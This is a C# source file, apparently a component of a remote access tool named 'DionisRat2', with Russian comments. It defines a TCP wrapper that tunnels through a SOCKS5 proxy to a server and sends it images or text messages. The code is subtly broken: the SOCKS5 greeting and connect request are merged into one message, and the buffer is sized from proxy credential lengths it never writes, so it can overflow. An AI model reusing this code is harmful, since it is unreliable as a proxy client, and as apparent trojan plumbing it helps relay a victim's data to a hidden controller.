using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace DionisRat2
{
    public class TcpClientWrapper : IDisposable
    {
        private TcpClient client;
        private NetworkStream stream;
        private readonly string proxyIp;
        private readonly int proxyPort;
        private readonly string serverIp;
        private readonly int serverPort;
        private readonly string proxyUsername;
        private readonly string proxyPassword;

        public TcpClientWrapper(string proxyIp, int proxyPort, string proxyUsername, string proxyPassword, string serverIp, int serverPort)
        {
            this.proxyIp = proxyIp;
            this.proxyPort = proxyPort;
            this.proxyUsername = proxyUsername;
            this.proxyPassword = proxyPassword;
            this.serverIp = serverIp;
            this.serverPort = serverPort;

            Connect();
        }

        private void Connect()
        {
            try
            {
                // Создание TCP-соединения через прокси
                client = new TcpClient(proxyIp, proxyPort);
                stream = client.GetStream();

                // Отправка запроса на подключение к целевому серверу через прокси
                SendConnectRequest();
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException($"Ошибка подключения к серверу через прокси: {ex.Message}");
            }
        }

        private void SendConnectRequest()
        {
            // Формируем запрос на подключение через прокси
            byte[] request = new byte[6 + proxyUsername.Length + proxyPassword.Length];
            request[0] = 0x05; // SOCKS5
            request[1] = 0x01; // Количество методов аутентификации
            request[2] = 0x00; // Метод аутентификации "Нет аутентификации"
            request[3] = 0x01; // Команда: "Подключение"
            request[4] = 0x00; // Зарезервировано
            request[5] = 0x01; // IPv4
            Array.Copy(IPAddress.Parse(serverIp).GetAddressBytes(), 0, request, 6, 4);
            Array.Copy(BitConverter.GetBytes((ushort)serverPort).Reverse().ToArray(), 0, request, 10, 2);

            // Отправляем запрос
            stream.Write(request, 0, request.Length);

            // Ожидаем ответ от прокси
            byte[] response = new byte[2];
            stream.Read(response, 0, response.Length);

            // Проверка успешности подключения
            if (response[1] != 0x00)
            {
                throw new InvalidOperationException("Не удалось подключиться к серверу через прокси.");
            }
        }

        public async Task<string> SendRequestAsync(byte[] imageBytes = null, string textMessage = null)
        {
            try
            {
                if (imageBytes != null)
                {
                    // Отправка изображения
                    await stream.WriteAsync(imageBytes, 0, imageBytes.Length);
                    return "Изображение отправлено";
                }
                else if (textMessage != null)
                {
                    // Отправка текстового сообщения
                    byte[] messageBytes = Encoding.UTF8.GetBytes(textMessage);
                    await stream.WriteAsync(messageBytes, 0, messageBytes.Length);
                    return "Сообщение отправлено";
                }
                return "Нет данных для отправки";
            }
            catch (Exception ex)
            {
                return $"Ошибка отправки: {ex.Message}";
            }
        }

        public void Dispose()
        {
            try
            {
                stream?.Close();
                client?.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при закрытии соединения: {ex.Message}");
            }
        }
    }

}
